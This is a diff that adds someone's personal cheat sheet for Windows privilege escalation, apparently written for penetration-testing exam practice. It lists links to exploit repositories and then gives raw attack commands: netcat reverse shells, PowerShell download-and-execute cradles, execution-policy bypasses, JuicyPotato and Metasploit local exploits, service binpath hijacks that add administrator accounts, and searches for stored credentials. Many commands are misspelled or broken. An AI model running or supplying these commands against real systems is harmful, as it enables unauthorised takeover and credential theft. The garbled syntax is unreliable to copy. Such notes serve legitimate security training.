@@ -1,0 +1,151 @@
+LINKS
+https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842
+https://github.com/sagishahar/lpeworkshop
+https://www.fuzzysecurity.com/tutorials/16.html
+https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+HTTPS://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/
+https://guif.re/windowseop
+https://hardmicro.net/es/artículos/198-como-crear-usuarios-desde-cmd
+http://www.fuzzysecurity.com/tutorials/16.html
+https://shellterlabs.com/en/training/get-started/writing-exploits/
+https://github.com/samratashok/nishang
+https://www.youtube.com/watch?v=gpPrSVFKjtk---como utilizarla
+https://shellterlabs.com/en/contests/challenges/?event=10
+http://dann.com.br/oscp-offensive-security-certification-pwk-course-review/
+https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
+https://guif.re/windowseop servicio
+https://github.com/AxtMueller/Windows-Kernel-Explorer/tree/master/binaries exe busca binarios
+https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+https://github.com/morph3/Windows-Red-Team-Cheat-Sheat / runas
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://github.com/frizb/Windows-Privilege-Escalation
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+https://www.hackplayers.com/2020/04/creacion-de-dlls-maliciosas-para-hijacking.html
+https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#rottenpotato-token-impersonation
+https://github.com/six2dez/OSCP-Human-Guide/blob/master/oscp_human_guide.md
+https://github.com/itm4n/FullPowers
+https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+http://www.fuzzysecurity.com/tutorials/16.html
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+https://guif.re/windowseop
+Fuente: https://www.enmimaquinafunciona.com/pregunta/94471/como-desactivar-windows-defender-desde-la-linea-de-comandos
+https://searchsecurity.techtarget.com/tutorial/Mimikatz-tutorial-How-it-hacks-Windows-passwords-credentials
+https://hacknpentest.com/mimikatz-windows-tutorial-beginners-guide-part-1/
+https://github.com/pentestmonkey/windows-privesc-check/blob/master/docs/QuickStartUsage.md
+https://countuponsecurity.com/tag/malicious-mof-file/
+https://github.com/0x00-0x00/shellpop#meterpreter-shells-new
+https://recipeforroot.com/advanced-powerup-ps1-usage/
+https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
+https://github.com/enjoiz/Privesc/blob/master/privesc.ps1
+https://github.com/foxglovesec/RottenPotato
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+https://github.com/Re4son/Chimichurri
+https://0xrick.github.io/hack-the-box/access/
+https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
+-----------------
+---------------------------------------
+-----------
+Creds in Files
+dir /b /s web.config
+dir       unattend.xml
+	  sysprep.inf
+	  sysprep.xml
+	  *pass*
+          backups
+dir /a-r-d /s /b archivos escri
+SYSVOL
+------------------------------------------
+---------------------------------------------
+JuicyPotato.exe -l 443 -p binario_hecho_con_msfvenom.exe -t *
+dir -force ver comando ocultos
+whoami /all
+whoami /groups
+icacls *.exe dentro de la carpeta par ver permisos
+--------------------------------------------------------------------------
+Runas
+net user admnistrator
+password requiered no
+runas /user:Administrator /savecred "nc.exe -d cmd.exe ip port"
+runas /netonly /user:CSCOU\☻jarrieta "cmd.exe"
+---------------------------------------------------------------------------
+meterpreter
+bypassuac
+meterpreter potato
+meterprter incognito
+systeminfo
+en meterpreter habiendo metido un exe
+load powerhsell
+powershell_Execute "whoami"
+powershell_import ' '
+powershell_Execute "find-allvulns"
+post/multi/recon/local_exploit_suggester
+post/windows/gather/enum_patches
+post/multi/recon/local_exploit_suggester
+use exploit/windows/local/ppr_flatten_rec
+use exploit/windows/local/always_install_elevated
+----------------------------------------------------------------------------
+certutl -urlcache -split -f hpttt nombre fichero
+--------------------------------------------------------------------------
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')"
+powershell "(New-Object Net-WebClient).downloadString('httt')"
+powershell "IEX(New-Object Net-WebClient).downloadString('httt')"
+powershell "IEX(New-Object Net.WebClient).downloadString('httt')"
+powershell -EP archivco -bypass
+powershell -exec bypass
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIntercative -NoProfile -File wget.ps1
+powershell -ep bypass
+..........................................................................
+weak service permissions
+Accesschk-exe -qwcu "Authenticad Users"
+Accesschk.exe -qwcu "Users" *
+Accesschk.exe -qwcu "Everyone" *
+----------------------------------------------------------------------------
+Services 
+wmic service get name.pathname,startmode |findstr /i /v "c:\Windows\\" |findstr /i /v """
+net user bob bob /add
+denied
+sc config codemeter.exe binpath= "net user bowser b0ws3r! /add"
+start codemeter.exe
+sc config codemeter.exe binpath= "net localgroup administrator bowser /add"
+start codemeter.exe
+----------------------------------------------------------------------------
+ICACLS SCSIACCESS.EXE permisos
+icacls c:\windows\*
+icacls file
+-----------------------------------------------------------------------------------
+net user will will /add
+net locagroup administrator will /add
+-------------------------------------------------------------------------------------
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+find all those strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+dir /s *pass* == *cred* == *vnc* == *.config*
+dir /a-r-d /s /b
+c:\unattended.txt
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+Vnc.ini
+ultravnc.ini
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+Services\Services.xml
+ScheduledTasks\ScheduledTasks.xml
+Printers\Printers.xml
+Drives\Drives.xml
+DataSources\DataSources.xml
+-------------------------------------------------------------------------
+Invoke-SERVICEaBUSE -nAME 'uSOsVC' -Commnad "C:\Windows\Temp\nc.exe -e cmd ip port"
+
+
+
+
+
+
